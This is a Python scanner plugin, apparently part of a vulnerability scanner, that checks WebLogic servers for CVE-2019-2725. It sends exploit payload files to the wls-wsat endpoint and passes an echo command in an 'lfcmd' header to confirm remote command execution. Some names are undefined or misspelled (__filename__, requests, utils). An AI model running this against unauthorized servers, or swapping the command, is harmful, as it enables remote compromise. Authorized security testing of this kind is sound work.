#encoding:utf-8

import os
from urlparse import urlparse

def getpayload(filename):
    dirname = os.path.dirname(__filename__)
    path = os.path.join(dirname,filename)
    with open(path) as f:
        data = f.read()
    return data

def geturl(uri):
    _uri = urlparse(uri)
    url = "%s://%s/" % (_uri.scheme,_uri.netloc)
    return url

def exp4url(uri):
    message = {"request_stat": 0, "message": ""}
    url = geturl(uri)
    vulnerable = False
    paths = ["wls-wsat/CoordinatorPortType"]
    for path in paths:
        vul_url = url+path
        if check_url(vul_url,"cve-2019-2725-payload.txt"):
            message["request_stat"] = 3
            message["message"] += "CVE-2019-2725|#|weblogic_10,Java < 7U21|,|"
        if check_url(vul_url,"cve-2019-2725-payload-bypass-jdk6.txt"):
            message["request_stat"] = 3
            message["message"] += "CVE-2019-2725|#|weblogic_10,Java < 6|,|"
        if message["request_stat"] == 0:
            if check_url(vul_url,"cve-2019-2725-weblogic12.txt"):
                message["request_stat"] = 3
                message["message"] += "CVE-2019-2725|#|weblogic_12|,|"
        if message["request_stat"] > 0:
            break
    return message

def check_url(url,payload):
    data = getpayload(payload)
    headers = {
        'Content-Type':'text/xml',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'SOAPAction':'',
        'lfcmd':'echo shtec_test_weblogic'
    }
    res = requests.post(url, data=data, verify=False, headers=headers)
    if "shtec_test_weblogic" in res.text:
        return True
    else:
        return False

def exp4req(request):
    url = geturl(request["url"])
    key = utils.getkey(__filename__)
    if utils.check4once_scan(url,key,scanrecord):
        return key,{"request_stat": 0, "message": ""}
    message = exp4url(url)
    return key,message
